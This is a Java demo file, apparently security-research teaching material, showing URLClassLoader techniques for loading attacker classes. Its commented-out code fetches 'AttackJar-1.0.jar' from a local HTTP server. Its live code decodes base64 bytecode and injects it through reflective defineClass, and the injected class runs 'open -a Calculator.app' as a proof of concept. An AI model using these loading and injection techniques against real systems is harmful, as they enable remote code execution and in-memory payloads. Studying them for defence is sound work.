package org.example;

import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;

/**
 * @author Whoopsunix
 * URLClassLoader 类加载
 */
public class URLClassLoaderDemo {
    public static void main(String[] args) throws Exception {
        /**
         * 调用 static
         */
//        URL url = new URL("http://127.0.0.1:1234/AttackJar-1.0.jar");
//        URLClassLoader classLoader = new URLClassLoader(new URL[]{url});
//        Class<?> loadedClass = classLoader.loadClass("org.example.Exec");
//        Object object = loadedClass.newInstance();

//        java.net.URL url = new java.net.URL("http://127.0.0.1:1234/");
//        java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{url});
//        Class<?> loadedClass = classLoader.loadClass("org.example.Exec");
//        Object object = loadedClass.getConstructor(null).newInstance(null);

        /**
         * 加载字节码
         */
        // open -a Calculator.app
        String b64Str = "yv66vgAAADQAMgoACwAZCQAaABsIABwKAB0AHgoAHwAgCAAhCgAfACIHACMIACQHACUHACYBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEkxvcmcvZXhhbXBsZS9FeGVjOwEADVN0YWNrTWFwVGFibGUHACUHACMBAAg8Y2xpbml0PgEAClNvdXJjZUZpbGUBAAlFeGVjLmphdmEMAAwADQcAJwwAKAApAQAERXhlYwcAKgwAKwAsBwAtDAAuAC8BABZvcGVuIC1hIENhbGN1bGF0b3IuYXBwDAAwADEBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQALc3RhdGljIEV4ZWMBABBvcmcvZXhhbXBsZS9FeGVjAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAKAAsAAAAAAAIAAQAMAA0AAQAOAAAAdgACAAIAAAAaKrcAAbIAAhIDtgAEuAAFEga2AAdXpwAETLEAAQAEABUAGAAIAAMADwAAABoABgAAAAcABAAJAAwACgAVAAwAGAALABkADQAQAAAADAABAAAAGgARABIAAAATAAAAEAAC/wAYAAEHABQAAQcAFQAACAAWAA0AAQAOAAAAWwACAAEAAAAWsgACEgm2AAS4AAUSBrYAB1enAARLsQABAAAAEQAUAAgAAwAPAAAAFgAFAAAAEQAIABIAEQAUABQAEwAVABUAEAAAAAIAAAATAAAABwACVAcAFQAAAQAXAAAAAgAY";
        byte[] bytes = java.util.Base64.getDecoder().decode(b64Str);

        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
        Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        defMethod.setAccessible(true);
        Class cls = (Class) defMethod.invoke(urlClassLoader, bytes, 0, bytes.length);
        cls.newInstance();



        /**
         * 调用构造方法
         */
//        java.net.URL url = new java.net.URL("http://127.0.0.1:1234/AttackJar-1.0.jar");
//        java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{url});
//        Class<?> loadedClass = classLoader.loadClass("org.example.ExecArg");
//        // public
////        Object object = loadedClass.getConstructor(String.class).newInstance("open -a Calculator.app");
//        // private
//        Class cls = String.class;
//        java.lang.reflect.Constructor constructor = loadedClass.getDeclaredConstructor(cls);
//        constructor.setAccessible(true);
//        Object object = constructor.newInstance("open -a Calculator.app");

        /**
         * 调用方法
         */
//        URL url = new URL("http://127.0.0.1:1234/AttackJar-1.0.jar");
//        URLClassLoader classLoader = new URLClassLoader(new URL[]{url});
//        Class<?> loadedClass = classLoader.loadClass("org.example.ExecArg");
//        Object object = loadedClass.newInstance();
//        loadedClass.getMethod("exec", String.class).invoke(object, "open -a Calculator.app");



    }
}
